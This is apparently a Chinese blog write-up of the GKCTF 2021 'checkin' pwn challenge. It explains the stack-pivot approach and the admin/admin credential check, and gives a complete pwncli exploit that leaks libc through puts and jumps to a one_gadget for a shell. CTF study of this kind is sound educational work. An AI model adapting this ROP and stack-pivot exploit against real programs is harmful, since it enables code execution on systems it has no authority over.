# GKCTF-2021-checkin



### 总结

根据本题，学习与收获有：

- 如果程序的栈溢出只覆盖到`rbp`，那么大概率也是考栈迁移，只是刚好当前函数结束后会执行依次`leave; ret`，然后上层函数还有一次`leave; ret`
- 合理利用程序中的`gadgets`，比如`call puts`指令等。劫持了`rdi`之后衔接一个`call puts`，即可泄露地址

<!-- more -->

### 题目分析

#### checksec

![image-20210815162221936](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815162221936.png)

#### 函数分析

##### vuln

![image-20210815162352089](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815162352089.png)

这个哈希函数是怎么看出来的呢？一半靠经验，一般靠猜

##### md5_hash

经验：

![image-20210815162621594](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815162621594.png)

猜测某个字符的`md5`为：

![image-20210815162751484](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815162751484.png)

这里需要转换一下字节序，后来一试，就是`admin`，也就是说`user=admin passwd=admin`



### 利用过程

- 第一次栈迁移

  >  需要注意的是，迁移后的栈只有`0x18`个字节的操作空间，如果执行个`pop rdi; ret | rdi_value`，就只剩返回地址了。这个时候可以利用：
  >
  > ![image-20210815163153294](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815163153294.png)
  >
  > 刚好可以泄露地址，又可以执行第二遍栈迁移

- 第二次栈迁移，此时的栈已经在`data`段上了，那么直接上`one_gadget`肯定可以滿足条件，因为`$sp+0x70`之类的，大概率是`0`。此时需要注意的是，由于栈迁移到了`data`上，所以构造`payload`也需要格外注意一下，可以调试着去构造`payload`

### exp

```python
from pwncli import *

cli_script()

p = gift['io']
libc = gift['libc']

gadget = 0x4527a

pop_rdi_ret = 0x401ab3
puts_got_addr = 0x602028
call_puts_addr = 0x4018b5
s1_addr = 0x602400

payload1 = flat({
    0:"admin\x00\x00\x00",
    8: [pop_rdi_ret, puts_got_addr, call_puts_addr]
})

payload2 = flat({
    0:"admin\x00\x00\x00",
    0x20:s1_addr
}, length=0x28, filler="\x00")

# stack pivot
p.sendafter(">", payload1)
p.recvuntil("u Pass\n")
p.sendafter(">", payload2)

msg = p.recvuntil("\x7f")

libc_base_addr = u64(msg[-6:].ljust(8, b"\x00")) - libc.sym['puts']
log_address("libc_base_addr", libc_base_addr)

one_gadget_addr = libc_base_addr + gadget

payload1 = flat({
    0:"admin\x00\x00\x00",
    8: [0, 0, one_gadget_addr]
})

payload2 = flat({
    0:"admin\x00\x00\x00",
    0x10:"admin\x00\x00\x00",
    0x20:s1_addr
}, length=0x28, filler="\x00")

# pivot again
p.sendafter(">", payload1)
p.recvuntil("u Pass\n")
p.sendafter(">", payload2)

p.interactive()
```

泄露地址与第一次栈迁移：

![image-20210815164314149](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815164314149.png)

拿到`shell`：

![image-20210815164401518](https://lynne-markdown.oss-cn-hangzhou.aliyuncs.com/img/image-20210815164401518.png)

### 引用与参考

1、[My Blog](https://roderickchan.github.io)

2、[Ctf Wiki](https://ctf-wiki.org/)

3、[pwncli](https://github.com/RoderickChan/pwncli)

---

> 作者: [roderick](https://roderickchan.github.io)  
> URL: https://roderickchan.github.io/zh-cn/2021-08-14-gkctf-2021-checkin/  

